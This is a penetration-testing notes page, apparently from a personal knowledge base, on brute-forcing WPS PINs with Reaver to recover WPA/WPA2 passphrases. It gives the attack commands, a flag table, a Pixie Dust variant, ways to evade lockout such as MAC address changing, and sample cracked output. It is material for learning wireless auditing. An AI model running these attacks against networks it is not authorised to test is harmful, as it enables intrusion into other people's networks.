---
tags: [pentest, wireless, wps, reaver, brute-force, both, initial-access]
tool: reaver
phase: 5
---
# Reaver — WPS PIN Brute Force

Online brute-force attack against WPS (WiFi Protected Setup) PIN. Recovers the WPA/WPA2 passphrase by trying all 11,000 possible PIN combinations.

[[10 - Wireless/00 - README|Folder index]]

## Install / verify

```bash
which reaver
sudo apt install reaver
```

## Prerequisites

- Target AP must have WPS enabled (check with [[14 - wash WPS Discovery]])
- Monitor mode active
- AP must not have WPS lockout enabled (or you need to work around it)

## Basic attack

```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv
```

| Flag | Meaning |
| --- | --- |
| `-i` | Monitor interface |
| `-b` | Target BSSID |
| `-c` | Channel (speeds up attack) |
| `-vv` | Very verbose |
| `-K` | Pixie Dust attack (offline, much faster) |
| `-d 2` | Delay between PINs (seconds) |
| `-t 5` | Timeout per PIN attempt |
| `-r 3:60` | After 3 attempts, sleep 60 seconds |
| `-N` | Don't send NACK packets |
| `-S` | Use small DH keys (faster) |
| `-p <PIN>` | Try a specific PIN |
| `-f` | Force — don't check for WPS lockout |

## Pixie Dust (offline — try this first)

```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K -vv
```

Pixie Dust exploits weak random number generators in some WPS implementations. Takes seconds instead of hours. See [[11 - Pixie Dust Attack]] for details.

## Dealing with WPS lockout

| Strategy | Command |
| --- | --- |
| Slow down | `-d 10 -r 3:60` |
| MAC change between locks | `macchanger -r wlan0mon` then retry |
| Use Bully instead | [[10 - Bully WPS]] handles lockout differently |

> [!warning] WPS lockout
> Many modern routers lock WPS after 3-5 failed attempts. Some lock permanently until reboot. The `-r` flag helps, but you may need to wait 5-10 minutes between batches.

## Output

```text
[+] WPS PIN: '12345670'
[+] WPA PSK: 'MySecretPassword'
[+] AP SSID: 'TargetNetwork'
```

## See also

- [[10 - Bully WPS]]
- [[11 - Pixie Dust Attack]]
- [[14 - wash WPS Discovery]]
